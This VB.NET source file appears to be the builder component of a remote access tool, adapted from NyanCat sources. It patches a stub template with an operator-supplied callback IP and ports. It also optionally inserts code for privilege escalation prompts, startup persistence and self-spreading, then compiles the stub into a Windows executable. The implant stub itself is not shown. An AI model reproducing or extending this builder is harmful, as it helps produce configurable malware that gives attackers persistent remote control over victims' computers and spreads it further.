Public Class BuilderClass
    ''||       AUTHOR Arsium       ||
    ''||       github : https://github.com/arsium       ||
    ''This has been adpated from NyanCat Sources (in C#) By Arsium
    Public Shared Sub Build()




        Using fd As New SaveFileDialog

            If fd.ShowDialog = Windows.Forms.DialogResult.OK Then
                Dim p As String = My.Resources.String1.Replace("127.0.0.1", REMOTE_BUILDER.TextBox1.Text)
                Dim p2 As String = p.Replace("8080", REMOTE_BUILDER.NumericUpDown2.Value)

                p2 = p2.Replace("1800", REMOTE_BUILDER.Remote_VPORT_UP.Value)

                Dim p3
                Dim p4
                Dim p5
                ''Strings2 has been translated from C# coming  : https://itneverworksfirsttime.wordpress.com/2012/02/27/using-uac-to-request-administrative-privileges-from-c/
                If REMOTE_BUILDER.stealth_CHK_BOX.Checked = False Then

                    p3 = p2.Replace("''ADD PERMISSION", My.Resources.String2)
                Else
                    p3 = p2
                End If



                If REMOTE_BUILDER.AddToStartup.Checked = True Then

                    p4 = p3.Replace("''ADD STARTUP", My.Resources.String3)
                Else
                    p4 = p3
                End If



                If REMOTE_BUILDER.Spread_CHK_BOX.Checked = True Then

                    p4 = p4.Replace("''ADD SPREAD", My.Resources.String4)

                End If



                Dim Stub = p4

                Try


                    Dim providerOptions = New Dictionary(Of String, String)
                    providerOptions.Add("CompilerVersion", "v4.0")
                    Dim CodeProvider As New VBCodeProvider(providerOptions)
                    Dim Parameters As New CodeDom.Compiler.CompilerParameters
                    Dim OP As String
                    If REMOTE_BUILDER.X86BOX.Checked = True And REMOTE_BUILDER.x64BOX.Checked = False Then
                        OP = " /target:winexe /platform:x86 /optimize+ /nowarn /nologo /nowin32manifest /nostdlib"
                    End If
                    If REMOTE_BUILDER.x64BOX.Checked = True And REMOTE_BUILDER.X86BOX.Checked = False Then
                        OP = " /target:winexe /platform:x64 /optimize+ /nowarn /nologo /nowin32manifest /nostdlib"
                    End If
                    If REMOTE_BUILDER.x64BOX.Checked = False And REMOTE_BUILDER.X86BOX.Checked = False Then
                        OP = " /target:winexe /platform:anycpu /optimize+ /nowarn /nologo /nowin32manifest /nostdlib"
                    End If

                    '     Dim OP As String = " /target:winexe /platform:x86 /optimize+ /nowarn /nostdlib /noconfig /nowarn /nologo /unsafe"
                    With Parameters

                        .GenerateExecutable = True

                        .OutputAssembly = fd.FileName
                        .CompilerOptions = OP
                        .IncludeDebugInformation = False

                        .ReferencedAssemblies.Add("System.Windows.Forms.dll")
                        .ReferencedAssemblies.Add("System.dll")
                        '.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
                        .ReferencedAssemblies.Add("System.Management.dll")
                        .ReferencedAssemblies.Add("System.Drawing.dll")
                        ' .ReferencedAssemblies.Add("System.Security.dll")
                        .ReferencedAssemblies.Add("System.Deployment.dll")
                        .ReferencedAssemblies.Add("System.Data.dll")
                        '  .ReferencedAssemblies.Add("System.Xml.dll")
                        .ReferencedAssemblies.Add("System.Net.dll")
                        .ReferencedAssemblies.Add("System.Threading.Tasks.dll")
                        .ReferencedAssemblies.Add("System.Net.Sockets.dll")
                        .ReferencedAssemblies.Add("System.Threading.Tasks.dll")
                        .ReferencedAssemblies.Add("System.IO.dll")


                        Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Stub)



                        For Each uii As CodeDom.Compiler.CompilerError In Results.Errors
                            MsgBox(uii.ToString)
                            Exit Sub
                        Next




                    End With
                    Beep()
                    MessageBox.Show("Done !", "Infos", MessageBoxButtons.OK, MessageBoxIcon.Information)
                Catch ex As Exception
                    MsgBox(ex.Message, MsgBoxStyle.Exclamation)
                End Try
            End If

        End Using
    End Sub
End Class
